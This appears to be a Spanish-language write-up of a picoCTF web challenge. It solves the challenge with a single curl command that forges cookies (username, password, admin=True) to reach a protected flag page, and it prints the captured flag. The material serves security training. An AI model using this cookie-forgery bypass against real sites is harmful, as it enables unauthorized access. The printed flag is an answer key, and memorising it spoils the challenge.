## Descripción
The factory is hiding things from all of its users.

Can you login as Joe and find what they've been looking at? [http://fickle-tempest.picoctf.net:61997](http://fickle-tempest.picoctf.net:61997/)
## Solución
```
FireBoss478-academy@webshell:~$ curl http://fickle-tempest.picoctf.net:59618/flag -H "Cookie: password=hola; username=hola; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0  15775      0 --:--:-- --:--:-- --:--:-- 15807
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>
```
Solución:
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
## Notas adicionales
## Referencias
